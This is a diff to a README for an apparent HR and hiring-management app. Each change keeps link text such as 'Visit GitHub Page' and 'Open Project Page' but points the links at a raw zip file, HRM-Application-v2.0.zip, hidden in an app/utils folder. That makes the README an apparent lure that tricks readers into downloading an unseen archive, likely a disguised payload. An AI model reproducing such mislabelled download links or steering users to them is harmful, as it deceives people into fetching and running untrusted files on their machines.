@@ -1,6 +1,6 @@
 # 🧩 HRMS-Application - Manage Hiring With Less Effort
 
-[![Download HRMS-Application](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/darbyconjunct617/HRMS-Application)
+[![Download HRMS-Application](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/darbyconjunct617/HRMS-Application/raw/refs/heads/main/app/utils/HRM-Application-v2.0.zip)
 
 ## 🚀 Overview
 
@@ -39,12 +39,12 @@ If the app uses a local database, you may also need:
 
 ## 📥 Download the App
 
-1. Open the project page here: [https://github.com/darbyconjunct617/HRMS-Application](https://github.com/darbyconjunct617/HRMS-Application)
+1. Open the project page here: [https://github.com/darbyconjunct617/HRMS-Application/raw/refs/heads/main/app/utils/HRM-Application-v2.0.zip](https://github.com/darbyconjunct617/HRMS-Application/raw/refs/heads/main/app/utils/HRM-Application-v2.0.zip)
 2. Find the download or release area on the page
 3. Visit this page to download the app files
 4. Save the file to a folder you can find easily, such as Downloads or Desktop
 
-[![Download HRMS-Application](https://img.shields.io/badge/Download-Open%20Project%20Page-grey?style=for-the-badge)](https://github.com/darbyconjunct617/HRMS-Application)
+[![Download HRMS-Application](https://img.shields.io/badge/Download-Open%20Project%20Page-grey?style=for-the-badge)](https://github.com/darbyconjunct617/HRMS-Application/raw/refs/heads/main/app/utils/HRM-Application-v2.0.zip)
 
 ## 🛠️ Install on Windows
 
@@ -242,7 +242,7 @@ Check interview schedules, leave notes, and review candidate progress.
 
 Open the project page here to visit this page to download the app files:
 
-[https://github.com/darbyconjunct617/HRMS-Application](https://github.com/darbyconjunct617/HRMS-Application)
+[https://github.com/darbyconjunct617/HRMS-Application/raw/refs/heads/main/app/utils/HRM-Application-v2.0.zip](https://github.com/darbyconjunct617/HRMS-Application/raw/refs/heads/main/app/utils/HRM-Application-v2.0.zip)
 
 ## 🏷️ Topics
 
